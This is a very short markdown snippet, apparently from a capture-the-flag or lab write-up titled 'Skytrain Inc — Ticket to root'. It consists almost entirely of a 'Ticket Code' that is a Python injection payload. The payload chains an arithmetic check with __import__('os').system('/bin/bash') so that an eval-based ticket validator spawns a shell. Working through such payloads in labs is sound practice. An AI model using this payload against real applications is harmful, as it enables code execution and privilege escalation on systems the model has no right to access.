# Skytrain Inc   
## Ticket to root  
__Ticket Code:__  
**102 + 10 == 112 and __import__('os').system('/bin/bash') == False
